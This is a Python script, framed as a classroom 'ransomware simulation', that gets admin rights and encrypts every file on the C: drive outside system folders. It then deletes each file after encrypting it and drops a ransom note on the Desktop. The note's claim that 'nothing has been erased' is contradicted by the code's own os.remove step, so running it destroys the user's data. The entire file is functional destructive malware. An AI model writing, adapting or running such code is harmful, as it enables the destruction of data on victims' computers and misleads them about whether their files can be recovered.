import os
import sys
import ctypes
import threading
import time
from cryptography.fernet import Fernet
from rich.console import Console
import ui

console = Console()

def es_administrador():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def cipher():

    key = Fernet.generate_key()
    with open("C:\\root_audit.key", "wb") as f:
        f.write(key)
    f_cipher = Fernet(key)

    for raiz, dirs, archivos in os.walk("C:\\"):
        if any(x in raiz for x in ["Windows", "Program Files", "AppData"]):
            continue
            
        for archivo in archivos:
            if archivo.endswith(".encrypted") or "audit.key" in archivo:
                continue
            
            ruta = os.path.join(raiz, archivo)
            try:

                with open(ruta, "rb") as f_in:
                    datos = f_in.read()
                
                with open(ruta, "wb") as f_out:
                    f_out.write(f_cipher.encrypt(datos))
                
                os.remove(ruta)
                print(f"[OK] Cifrado: {archivo}")
                
            except Exception as e:

                pass

def nota():
    escritorio = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    
    nombre_archivo = "hello.txt"
    ruta_nota = os.path.join(escritorio, nombre_archivo)
    
    contenido = (
        "--- BOOSHDAG-IO: EDUCATIONAL RANSOMWARE SIMULATION ---\n\n"
        "Your files have been encrypted for a security test.\n"
        "This is an academic project for the Cybersecurity class.\n\n"
        "HOW TO RECOVER YOUR FILES:\n"
        "1. Don't panic. Nothing has been erased.\n"
        "2. Go to my GitHub: https://github.com/Booshdag-io/FRG_SOCIETY\n"
        "3. Download the script 'decryptor.py'.\n"
        "4. Run it to restore everything to normal.\n\n"
        " Your security key is in: C:\\root_audit.key\n"
        "------------------------------------------------------"
    )
    
    try:
        with open(ruta_nota, "w", encoding="utf-8") as f:
            f.write(contenido)
        print(f"[!] Ransom Note Created on: {escritorio}")
    except Exception as e:
        print(f"[-] The note could not be created on the Desktop: {e}")

if __name__ == "__main__":
    if es_administrador():
        cipher()
        nota()
        ui.terminal()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)